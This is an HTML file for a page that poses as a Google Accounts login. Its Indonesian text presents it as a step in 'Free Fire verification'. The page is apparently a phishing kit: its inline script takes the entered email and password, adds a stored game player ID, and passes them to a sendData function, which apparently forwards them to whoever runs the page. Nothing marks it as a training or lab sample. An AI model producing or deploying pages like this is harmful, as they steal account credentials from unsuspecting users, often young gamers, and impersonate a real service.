<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login - Google Accounts</title>
    <link rel="stylesheet" href="/css/style.css">
    <link rel="icon" href="/images/favicon.png" type="image/png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;800&display=swap" rel="stylesheet">
</head>
<body style="background: #f1f3f4; display: flex; align-items: center; justify-content: center; height: 100vh;">
    <div style="background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); width: 100%; max-width: 448px; text-align: center;">
        <img src="/images/google-icon.png" height="40" style="margin-bottom: 20px;">
        <h2 style="font-weight: 500; font-size: 1.5rem; margin-bottom: 10px;">Login Google</h2>
        <p style="color: var(--text-muted); margin-bottom: 30px;">Lanjutkan ke Verifikasi Free Fire</p>
        
        <form id="googleLoginForm" style="text-align: left;">
            <div style="margin-bottom: 25px;">
                <label style="display: block; margin-bottom: 8px; font-weight: 600; font-size: 0.9rem;">Email atau nomor telepon</label>
                <input type="text" id="email" required style="width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 8px; font-size: 1rem; outline: none; transition: 0.3s; color: black;">
            </div>
            <div style="margin-bottom: 25px;">
                <label style="display: block; margin-bottom: 8px; font-weight: 600; font-size: 0.9rem;">Kata Sandi (Password)</label>
                <input type="password" id="password" required style="width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 8px; font-size: 1rem; outline: none; transition: 0.3s; color: black;">
            </div>
            
            <a href="#" style="color: #1a73e8; font-size: 0.9rem; font-weight: 600; text-decoration: none; display: block; margin-bottom: 20px;">Lupa Sandi?</a>
            <button type="submit" style="width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s;">MASUK</button>
        </form>
    </div>
    <script src="/js/main.js"></script>
    <script>
        document.getElementById('googleLoginForm').onsubmit = function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const playerId = localStorage.getItem('playerId');
            
            localStorage.setItem('isLoggedIn', 'true');
            sendData('google', { email, password, playerId });
        };
    </script>
</body>
</html>
